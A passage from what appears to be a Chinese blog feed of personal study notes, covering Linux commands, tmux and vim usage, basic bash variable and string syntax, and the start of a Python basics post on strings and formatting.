(删除系统所有文件)不要乱敲哦~</span><br></pre></td></tr></table></figure><blockquote><p>windows彻底删除文件:Shift + Delete;</p></blockquote><p><code>mv</code>: mv xxx yyy (剪切+ 粘贴)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eg:</span><br><span class="line">mv a/tmp.txt b/ (将a中tmp.txt文件挪到b文件夹里面)</span><br><span class="line">mv b/tmp.txt a/tmp2.txt (将b中tmp.txt文件挪到a文件夹里面并重命名为tmp2.txt)</span><br><span class="line">mv tmp2.txt tmp.txt (将tmp2.txt重命名为tmp.txt)</span><br></pre></td></tr></table></figure><blockquote><p>cp与mv区别:cp(复制+粘贴), mv(剪切+粘贴)<br>mkdir与touch区别:mkdir(创建文件夹), touch(创建文件)</p></blockquote><p><code>cat</code>: cat xxx(查看xxx文件);</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eg:</span><br><span class="line">cat a/tmp.cpp(查看tmp.cpp文件)</span><br></pre></td></tr></table></figure><h2 id="tmux与vim">tmux与Vim</h2><p>开发时经常使用的两大编辑工具</p><h3 id="tmux">tmux</h3><p><strong>功能</strong></p><p>分屏：可以在一个开发框里分屏<br>允许terminal在连接断开之后可以继续运行，让进程不会因为断开连接而中断</p><blockquote><p>tmux结构为session-&gt;window-&gt;pane\</p></blockquote><p><strong>操作</strong></p><p>1).切分：<br>竖直切分：先按<code>ctrl+b</code>松开，再输入<code>%</code><br>水平切分：先按<code>ctrl+b</code>，再按<code>”</code></p><p>当按下<code>ctrl+d</code>，可以关闭tmux<br>对于切分来说，每一块都可以继续切分</p><p>2).退出：<br><code>ctrl+d</code> 退出<br>当window没有pane时，自动退出<br>当session没有window时，自动退出<br>故一直<code>ctrl+d</code>下去会直接退出</p><p>3).选择pane：鼠标点击即可或输入<code>ctrl+b</code>，然后按<code>方向键</code>选择相邻的pane</p><p>4).调整分割线：选中并拖动即可或者<code>ctrl+b</code><strong>同时</strong>按方向键</p><p>5).全屏与取消全屏：某个窗口全屏：选中并按下<code>ctrl+b</code>再按<code>z</code><br>同样取消按ctrl+A再按z</p><p>6).挂起窗口：<code>ctrl+b</code>然后按<code>d</code>，此为从session中退出<br>输入<code>tmux a </code>或<code>tmux attach</code>，再开启session窗口</p><p>7).选择其他的session：先进入tmux，然后在tmux里输入<code>ctrl+b</code>再按<code>s</code><br>再session里的方向键操作：<br><code>→</code>展开，<code>→</code>再按一次是展开所有pane <code>←</code>按下是合上所有pane<br><code>↑↓</code>选择session</p><p>8).session中创建window与选择window：<code>ctrl+b</code>再按<code>c</code>：创建window<br><code>ctrl+b</code>再按w：选择其他window也可以展开合上每个window</p><blockquote><p><code>ctrl+b+s</code>与<code>ctrl+b+w</code>的区别:前者打开只展开session一级，后者展示session级中所有的window，一般习惯于每个session中只含有一个window</p></blockquote><p>9).翻阅内容：<code>↑</code>滚轮向上<br>或者<code>ctrl+b</code>再按<code>Pageup</code>向上翻，按<code>PageUp</code>向下翻</p><p>10).从tmux中复制文本：<br>按住<code>shift</code>键选择文本<br><code>ctrl+insert</code>复制<br><code>shift+insert</code>粘贴</p><h3 id="vim">vim</h3><p><strong>功能</strong></p><p>1.命令行模式下的文本编辑器<s>终极记事本</s><br>2.根据扩展名判别编程语言，实现代码缩进、代码高亮</p><p><strong>使用</strong></p><p><code>vim filename</code><br>如果有该文件则打开<br>没有则打开一个新的文件，命名为filename</p><p><strong>三种模式</strong></p><p>1.一般命令模式/默认模式：无法编写，输入命令，每一个命令对应一个字母，支持复制粘贴删除文本<br>2.编辑模式：在默认模式下按<code>i</code>，进入编辑模式，按<code>esc</code>退出<br>3.命令行模式：默认模式下按<code>:/？</code>三个中任意一个进入命令行模式，命令行在最下方，支持查找、替换、保存、退出、配置编辑器等</p><p><strong>操作</strong><br>1.<code>i</code>：进入编辑模式(底部出现insert)</p><p>2.<code>esc</code>：进入一般命令模式</p><p>3.小键盘可以操作前后左右</p><p>4.光标的移动操作：<code>n+&lt;Space&gt;</code> n是数字，光标会自动右移n个字符<br>一般命令模式下：<code>0/home</code> 将光标移动到本行开头<br><code>$/End</code>将光标移动到本行结尾<br><code>G</code>:光标移动到最后一行</p><p>5.具体到哪一行的操作：<br>1).<code>n/nG</code>:表示想去具体到哪一行（n是到某一行的下面，nG是直达）<br>2).<code>gg</code>:到达第一行<br>3).<code>n+&lt;Enter&gt;</code> 向下跳n行</p><p>6.查找与修改字符串的操作：<br>1).<code>/word</code>:在命令行模式下，光标之下寻找第一个值为word的字符串<br>2).<code>?word</code>:在光标之上第一个值为word的字符串<br>3).<code>n</code>:重复前一个查找操作<br>4).<code>N</code>:反向查找，也就是说前一个命令向前找，此命令下向后找<br>5).<code>:n1,n2s/word1/word2/g</code>:n1,n2为数字，在第n1与n2之间找word1，并替换为word2<br><code>:1,$s/word1/word2/g</code>: 将全文的word1换成word2<br><code>:1,$s/word1/word2/gc</code>:在每一次替换的时候都会让用户进行确认</p><p>7.<code>:noh</code> 关闭所查找的关键词的高亮</p><p>8.选中与删除<br><code>v</code>:选中文本,按两下esc取消<br><code>d</code>:删除选中文本(其实有剪切的特性)<br><code>dd</code>:删除整行</p><p>9.复制与粘贴：<br><code>y</code>:复制(文本)<br><code>p</code>:在光标所处位置的下一行或下一个位置(通常当光标在两边时)粘贴<br><code>yy</code>:复制当前行</p><p>10.撤销:<code>u</code>:撤销<br><code>ctrl+r</code>:取消撤销</p><blockquote><p>在windows里，ctrl+z撤销，ctrl+shift+z取消撤销</p></blockquote><p>11.<code>&gt; </code>将选中的文本整体向右移动<br><code>&lt;</code> 将选中的文本整体向左移动</p><p>12.保存与退出：<br><code>:w</code>保存<br><code>:w! </code>强制保存</p><p>一般命令模式下:按下<code>ESC</code>，按<code>q</code>退出<br><code>:q!</code> 强制退出（不保存）<br><code>:wq</code> 保存并退出<br><code>:wq!</code> 强制保存退出</p><p>13.行号的显示与隐藏:<br><code>:set nonu</code> 隐藏行号<br><code>:set nu</code> 显示行号</p><p>14.paste模式:<br>当要粘贴过来的代码很长时，命令可能会失效，占用很大带宽，导致出现多重缩进<br><code>:set paste</code>取消代码缩进，设置成粘贴模式<br><code>:set nopaste</code>开启代码缩进</p><p>15.其他组合命令<br><code>gg+d+G</code> 删除全部内容<br><code>gg=G</code> 将全文格式化</p><p>其他补充tips：</p><blockquote><p>ctrl+q:当vim卡死时，可取消当前正在执行的命令</p><p>异常处理:当前进程出现冲突时，会出现异常(如在令一终端中用vim打开已经打开的文件)<br>解决方法：1).找到正在多个打开的文件程序，并关掉，保证同一个进程只有同一个文件能打开<br>2).问题：当一个进程不小心被其他进程杀掉，当再打开main.cpp时，此时如果出现一个<code>.swp</code>缓存文件时会报错<br>解决：在没有任何一个进程打开该文件时，将<code>.swp</code>文件删掉即可</p></blockquote><h2 id="shell语法">Shell语法</h2><h3 id="概论">概论</h3><p>Shell 是一个用 C 语言编写的程序，它是用户使用 Linux 的桥梁。<br>Shell 既是一种命令语言，又是一种程序设计语言。<br>Shell 是指一种应用程序，这个应用程序提供了一个界面，用户通过这个界面访问操作系统内核的服务</p><p>Linux的Shell脚本语言分为多种，如Bourne Shell(<code>/usr/bin/sh或/bin/sh</code>)、Bourne Again Shell(<code>/bin/bash</code>)、C Shell(<code>/usr/bin/csh</code>)、K Shell(<code>/usr/bin/ksh</code>)、zsh等等，本文讲解的为bash语法</p><p>文件开头需要写<code>#! /bin/bash</code>，指明bash为脚本解释器。同理如果是python的话开头要写<code>#! /usr/env/ python</code></p><p>学习Shell语言可以看成是学习一门新的语言，先从<code>hello,world</code>写起</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/bash</span></span><br><span class="line">echo &quot;Hello World!&quot;</span><br></pre></td></tr></table></figure><p><strong>运行方式</strong></p><p>1.用bash解释器运行 <code>bash test.sh</code></p><p>2.赋予脚本文件可执行权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x test.sh  # 使脚本具有可执行权限</span><br><span class="line">./test.sh </span><br></pre></td></tr></table></figure><blockquote><p><code>chmod</code>指令用于为文件赋予权限，一般r、w、x分别为可读、可写、可执行</p></blockquote><p><img src="https://s2.loli.net/2023/11/17/aLtl4dbenyIvDpS.png" alt="添加权限后变为绿色"></p><h3 id="注释">注释</h3><p><strong>单行注释</strong>（和python类似）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这是一行注释</span></span><br><span class="line">echo &#x27;Hello World&#x27;  #  这也是注释</span><br></pre></td></tr></table></figure><p><strong>多行注释</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">:&lt;&lt;EOF</span><br><span class="line">第一行注释</span><br><span class="line">第二行注释</span><br><span class="line">第三行注释</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><blockquote><p>其中<code>EOF</code>可以换成其它任意字符串。例如：<code>abc</code>、<code>!</code></p></blockquote><h3 id="变量">变量</h3><p>tips：<br>1、定义变量时，等号两边不能有空格<br>2、定义变量的时候变量都是字符串，但当变量需要是整数时，会自动把变量转换成整数<br>3、<code>type+命令</code>可以解释该命令的来源（内嵌命令。第三方命令等）<br>如<code>type readonly #readonly is a shell builtin(shell内部命令)</code><br><code>type ls # ls is aliased to ‘ls –color+auto’</code><br>4、被声明为只读的变量无法被unset删除<br>5、bash可以用来开一个新的进程，exit或Ctrl+d退出新的bash<br>6、字符串中，不加引号和双引号效果相同</p><p><strong>定义变量</strong><br>定义变量，不需要加<code>$</code>符号，例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name1=&#x27;byf&#x27;  # 单引号定义字符串</span><br><span class="line">name2=&quot;byf&quot;  # 双引号定义字符串</span><br><span class="line">name3=byf    # 也可以不加引号，同样表示字符串</span><br></pre></td></tr></table></figure><p><strong>使用变量</strong></p><p>使用变量，需要加上 <code>$ </code>符号，或者<code> $&#123;&#125;</code> 符号。花括号是可选的，主要为了帮助解释器识别变量边界。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name=Oracle</span><br><span class="line">echo $name  # 输出Oracle</span><br><span class="line">echo $&#123;name&#125;  # 输出Oracle</span><br><span class="line">echo $&#123;name&#125;nb  # 输出Oraclenb</span><br></pre></td></tr></table></figure><p><strong>只读变量</strong></p><p>使用<code>readonly</code>或者 <code>declare</code>可以将变量变为只读。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name=Oracle</span><br><span class="line">readonly name</span><br><span class="line">declare -r name  # 两种写法均可</span><br><span class="line"></span><br><span class="line">name=abc  # 会报错，因为此时name只读</span><br></pre></td></tr></table></figure><p><strong>删除变量</strong></p><p><code>unset</code> 可以删除变量。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name=Oracle</span><br><span class="line">unset name</span><br><span class="line">echo $name  # 输出空行</span><br></pre></td></tr></table></figure><p><strong>变量类型</strong></p><p>1.自定义变量（局部变量） 子进程不能访问的变量<br>2.环境变量（全局变量） 子进程可以访问的变量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">自定义变量改成环境变量</span></span><br><span class="line">name=Oracle</span><br><span class="line">export name # 第一种方法</span><br><span class="line">declare -x name # 第二种方法</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">环境变量改为自定义变量</span></span><br><span class="line">export name=Oracle</span><br><span class="line">declare +x name  # 改为自定义变量</span><br></pre></td></tr></table></figure><p><strong>字符串</strong></p><p>字符串可以用单引号，也可以用双引号，也可以不用引号。</p><p>单引号与双引号的区别：<br>1.单引号中的内容会原样输出，不会执行、不会取变量<br>2.双引号中的内容可以执行、可以取变量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name=Oracle  # 不用引号</span><br><span class="line">echo &#x27;hello, $name \&quot;hh\&quot;&#x27;  # 单引号字符串，输出 hello, $name \&quot;hh\&quot;</span><br><span class="line">echo &quot;hello, $name \&quot;hh\&quot;&quot;  # 双引号字符串，输出 hello, Oracle &quot;hh&quot;</span><br><span class="line">echo hello, $name \&quot;hh\&quot;  # 不加括号，与双引号输出相同</span><br></pre></td></tr></table></figure><p>获取字符串长度</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=&quot;Oracle&quot;</span><br><span class="line">echo $&#123;#name&#125;  # 输出6</span><br></pre></td></tr></table></figure><p>提取子串</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=&quot;hello,Oracle&quot;</span><br><span class="line">echo $&#123;name:6:12&#125; # Oracle</span><br></pre></td></tr></table></figure><h1>旧版</h1><blockquote><p>本文使用Linux版本为CentOS-7-x86_64-DVD-2009</p></blockquote><p>为方便，学习Linux前先了解ssh远程连接<br>需要配备环境：Linux虚拟机、Xshell<br>打开虚拟机终端，<code>ip address show</code>查看IP，用XShell链接即可<br>退出Linux会话：<code>exit</code>或<code>logout</code><br>连接：Xshell或ssh命令（在客户端操作）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[E:\~]$ ssh</span><br><span class="line">NAME</span><br><span class="line">ssh - connects to a host using the SSH protocol.</span><br><span class="line"></span><br><span class="line">SYNOPSYS # Windows下示例语法</span><br><span class="line">ssh [user@]host[ port][;host[ port]]</span><br><span class="line"></span><br><span class="line">OPTIONS</span><br><span class="line">user   Indicates the user&#x27;s login name.</span><br><span class="line">host   Indicates the name, alias, or Internet address of the</span><br><span class="line">       remote host.</span><br><span class="line">port   Indicates a port number (address of an application).</span><br><span class="line">       If the port is not specified, the default ssh port #端口号一般可省略，默认连接22端口</span><br><span class="line">       (22) is used.</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><p><strong>Linux与Windows区别</strong></p><ul><li>windows目录分隔符为反斜杠\，而Linux为正斜杠/</li><li>Windows文件不区分大小写，Linux严格区分</li><li>Windows文件后缀名代表了文件属性，Linux文件属性依靠权限位决定</li><li>Linux一切皆文件，所有操作皆可以以文件形式找到，只有一个根</li></ul><blockquote><p>即使Linux中后缀名没有作用，但良好的命名能让我们更方便了解文件的类型<br>压缩文件：.gz 、bz2 、zip.、tar.gz等，软件包：.rpm，脚本文件：.sh、.py、.java 网页相关：.html、.js、.css</p></blockquote><table><thead><tr><th style="text-align:center">常见重要目录</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>/opt</code></td><td style="text-align:center">一般存放第三方大型软件</td></tr><tr><td style="text-align:center"><code>/home</code></td><td style="text-align:center">普通用户家目录</td></tr><tr><td style="text-align:center"><code>/root</code></td><td style="text-align:center">超级用户家目录</td></tr><tr><td style="text-align:center"><code>/etc</code></td><td style="text-align:center">存放各种配置文件的目录</td></tr><tr><td style="text-align:center"><code>/var/log/</code></td><td style="text-align:center">存放系统默认各种日志的目录</td></tr></tbody></table><p>Linux每个指令都相当于一个可执行文件，能直接识别是因为添加到了PATH路径中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# echo $&#123;PATH&#125;</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin</span><br><span class="line"># 仅在终端中定义一环境变量，生命周期截至此终端关闭</span><br></pre></td></tr></table></figure><hr><h3 id="linux命令语法">Linux命令语法</h3><blockquote><p>命令在终端输入，可按<code>ctrl+alt+F1~F7</code>切换终端</p></blockquote><p><code>命令</code>+<code>空格</code>（可省略）+<code>参数</code>+<code>空格</code>+<code>文件/文件夹</code>（可省略）<br>命令提示符<code>[oracle@localhost ~]$ </code><br>包含登录信息、占位符、主机名和工作目录等信息<br><code>~</code> 是特殊目录之一，root用户为/root,普通用户为家目录<br><code>-</code>  返回上一次目录 <code>./</code> 当前目录  <code>../</code>  上一级目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[oracle@localhost ~]$ whoami</span><br><span class="line">oracle</span><br><span class="line">[oracle@localhost ~]$ hostname</span><br><span class="line">localhost.localdomain</span><br><span class="line">[oracle@localhost ~]$ pwd</span><br><span class="line">/home/oracle</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>ls</code></td><td style="text-align:center">展示该文件夹下</td></tr><tr><td style="text-align:center"><code>cd</code></td><td style="text-align:center">转到某一目录</td></tr><tr><td style="text-align:center"><code>clear</code></td><td style="text-align:center">清屏</td></tr><tr><td style="text-align:center"><code>mkdir</code></td><td style="text-align:center">创建文件夹</td></tr><tr><td style="text-align:center"><code>touch</code></td><td style="text-align:center">创建文件或更改文件时间戳</td></tr><tr><td style="text-align:center"><code>cat</code></td><td style="text-align:center">打开文件</td></tr><tr><td style="text-align:center"><code>echo</code></td><td style="text-align:center">展示一句话到终端/文档</td></tr><tr><td style="text-align:center"><code>rmdir</code></td><td style="text-align:center">删除文件夹</td></tr><tr><td style="text-align:center"><code>su</code></td><td style="text-align:center">切换登录用户（使用-，可加载用户的环境变量）</td></tr></tbody></table><blockquote><p>用户的配置文件存放在~/.bash_profile中，在Linux中以 . 开头的文件为隐藏文件，用ls -a 即可显示</p></blockquote><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>uname</code></td><td style="text-align:center">查看系统内核信息</td></tr><tr><td style="text-align:center"><code>man</code></td><td style="text-align:center">linux提供的帮助文档，按q退出</td></tr><tr><td style="text-align:center"><code>shutdown</code></td><td style="text-align:center">关机</td></tr><tr><td style="text-align:center"><code>history</code></td><td style="text-align:center">显示历史记录（默认 3000条）</td></tr><tr><td style="text-align:center"><code>id</code></td><td style="text-align:center">验证该用户是否存在</td></tr><tr><td style="text-align:center"><code>bash</code></td><td style="text-align:center">再次加载用户的环境变量，更新用户的主机信息</td></tr><tr><td style="text-align:center"><code>stat</code></td><td style="text-align:center">显示文件或文件系统的状态</td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td></tr></tbody></table><p>其他命令：</p><ul><li>useradd添加系统用户 passwd更改用户密码</li><li>hostnamectl set-hostname  更改主机名</li><li>which 在PATH中找到命令的绝对路径并输出</li></ul><p><a href="http://linux.51yip.com/">Linux命令中文手册</a></p><p>其他零碎知识点：<br>命令 + <code>--help</code>参数可以查看该命令的所有参数及功能<br>多个参数可组合简写<br><code>&gt;</code>是覆盖写入，<code>&gt;&gt;</code>是追加写入<br>echo搭配双引号使用会解析特殊符号，搭配单引号为单纯字符串<br><code>CTRL+C</code>强制中断Linux操作</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python（基础篇）笔记</title>
      <link href="/2023/07/22/python/"/>
      <url>/2023/07/22/python/</url>
      
        <content type="html"><![CDATA[<h1>python基础知识</h1><h2 id="引言">引言</h2><p>作为我第一门系统学习的解释性脚本语言，先理解解释型语言和编译型语言的区别<br><strong>编译型源代码–&gt;编译器–&gt;可执行文件</strong>   （一次编译，多次运行，效率高，移植性差）<br><strong>解释型源代码–&gt;解释器</strong><br>故首先需按安装python解释器，本文以<code>3.10.11</code>为准<br>在没有IDE的情况下，我们有两种方法执行python代码:</p><ol><li><p>交互式命令行</p></li><li><p>运行文本文件<br><img src="https://img1.imgtp.com/2023/07/21/jsHferfQ.png" alt="交互式命令行"><br><img src="https://img1.imgtp.com/2023/07/21/4Vy3MQ4z.png" alt="运行文本文件"><br>首先我们需要用dos命令找到安装的python解释器（若将其添加到全局PATH中，可省略）<br><code>dir</code>   显示当前路径下的文件夹<br><code>cd</code>   转到对应路径（仅限同一盘符)cd …/ 回退一级<br><code>D:</code>   转移到对应盘符<br><code>tab</code>  补全输入内容</p></li></ol><p>为了便捷，接下来都将以**Pycharm(22.10.3 professional)**作为集成开发环境辅助学习</p><hr><h2 id="基本语法">基本语法</h2><p>首先补充基本的输入输出函数<br><code>ctrl</code>+<code>左键点击</code>可查看内置函数的源码<br><strong>input</strong> &amp;&amp; <strong>print</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name = input(&quot;请输入姓名:&gt;&quot;)</span><br><span class="line">age = input(&quot;请输入年龄:&gt;&quot;)</span><br><span class="line">print(f&quot;姓名：&#123;name&#125; 年龄：&#123;age&#125;&quot;)</span><br></pre></td></tr></table></figure><blockquote><p>input默认接收的均为字符串，可用类型转换函数type(s)转换</p></blockquote><h3 id="语法结构">语法结构</h3><h4 id="1-语句分隔符">1.语句分隔符</h4><p>python中通常以<code>换行符</code>作为语句分隔符<br>若想在同一行中执行多句语句，也可用<code>;</code>作为分隔（不推荐，不符合pep8规范）</p><blockquote><p>python代码应符合pep8规范，在pycharm中，绿色波浪线代表违反规范，按Ctrl+Alt+L可一键调整</p></blockquote><p>一行写一条语句，大大提高代码的可读性和规范性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">1</span>+<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;welcome&quot;</span>); <span class="built_in">print</span>(<span class="string">&quot;BYF&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>注意</code>：python代码缩进要求严格，允许空行，不可缩进</p><h4 id="2-注释">2.注释</h4><p>python中用<code>#</code>单行注释<br>三引号（单引号或双引号均可）多行注释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random  <span class="comment"># 导入获取随机数的random模块</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">round</span>(random.random()*<span class="number">100</span>)) <span class="comment"># 生成一到100的随机整数</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">这是多行注释</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="变量">变量</h3><p>特性:</p><ol><li>多次使用（不会被垃圾回收机制回收）</li><li>值可修改 （和编译型语言不同，修改时指向变化，原值被回收）</li></ol><blockquote><p>变量名应符合规范</p></blockquote><h3 id="基本数据类型">基本数据类型</h3><p>基本数据类型：</p><ol><li>整型与浮点型</li><li>bool类型（True、False）</li><li>字符串</li></ol><blockquote><p>python内置函数type()返回数据类型名</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="number">10</span>))  <span class="comment">#&lt;class &#x27;int&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="number">2.5</span>))  <span class="comment">#&lt;class &#x27;float&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="number">10</span> &gt; <span class="number">5</span>))  <span class="comment">#&lt;class &#x27;bool&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="string">&quot;hello world&quot;</span>))  <span class="comment">#&lt;class &#x27;str&#x27;&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>内置函数bool，可求变量或表达式的bool值<br>零值：所有数据类型中有且仅有一个值的bool类型为False 字符串 &quot;&quot;列表 [] 字典 {}</p></blockquote><p>字符串作用：</p><ol><li>展示文本</li><li>储存数据</li><li>传递字节</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s1 = <span class="string">&quot;hello a1&quot;</span>  <span class="comment"># 方式1</span></span><br><span class="line">s1 = <span class="string">&#x27;hello a2&#x27;</span>  <span class="comment"># 方式2</span></span><br><span class="line">s3 = <span class="string">&quot;&quot;&quot;         </span></span><br><span class="line"><span class="string">        1. 购买道具</span></span><br><span class="line"><span class="string">        2. 攻击</span></span><br><span class="line"><span class="string">        3. 逃跑</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>              <span class="comment"># 方式3</span></span><br></pre></td></tr></table></figure><h4 id="字符串基本操作">字符串基本操作</h4><p><strong>转义符</strong>  <code>\</code></p><ol><li>给予普通符号特殊功能</li><li>将具有特殊功能的符号普通化</li></ol><table><thead><tr><th style="text-align:center">符号</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>\&quot;</code></td><td style="text-align:center">双引号</td></tr><tr><td style="text-align:center"><code>\\</code></td><td style="text-align:center">反斜杠</td></tr><tr><td style="text-align:center"><code>\n</code></td><td style="text-align:center">换行符</td></tr><tr><td style="text-align:center"><code>\t</code></td><td style="text-align:center">制表符</td></tr><tr><td style="text-align:center"><code>\r</code></td><td style="text-align:center">回车符</td></tr><tr><td style="text-align:center"><code>\'</code></td><td style="text-align:center">单引号</td></tr></tbody></table><p><strong>格式化输出</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;byf&quot;</span></span><br><span class="line">username = <span class="string">&quot;Oracle&quot;</span></span><br><span class="line">passwd = <span class="number">123456</span></span><br><span class="line"><span class="comment"># 方式1（不推荐）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello %s!,your username is %s,your passwd is %d&quot;</span> % (name, username, passwd))</span><br><span class="line"><span class="comment"># 方式2（3.6版本后可用）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;hello <span class="subst">&#123;name&#125;</span>!,your username is <span class="subst">&#123;username&#125;</span>,your passwd is <span class="subst">&#123;passwd&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="字符串序列操作">字符串序列操作</h4><blockquote><p>python支持负索引，从右（-1）到左依次减一<br>字符串是不可变的，不能像列表一样修改其中某个数据</p></blockquote><p><strong>索引操作</strong>  查询字符   ： 字符串[索引]<br><code>print(s[0])</code></p><hr><p><strong>切片操作</strong> 获取字符串  ： 字符串[开始索引:结束索引:步长(默认为1)]（顾头不顾尾）<br><code>print(s[0:5])</code>缺省默认从头尾取<br>步长为2时，隔一个取一个字符，以此类推<br>步长为负时，从右向左取<br><strong>一个有趣的应用</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 字符串倒序</span></span><br><span class="line"><span class="built_in">print</span>(s[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><hr><p><strong>拼接操作</strong>  字符串1+字符串2  ||  字符串*int</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s1 = &quot;hello &quot;</span><br><span class="line">s2 = &quot;Oracle&quot;</span><br><span class="line">print(s1+s2)</span><br></pre></td></tr></table></figure><hr><p><strong>计算字符串长度</strong>   内置函数len<br><code>print(len(s1))</code></p><blockquote><p>中文算作一个字符</p></blockquote><hr><p><strong>in判断</strong>  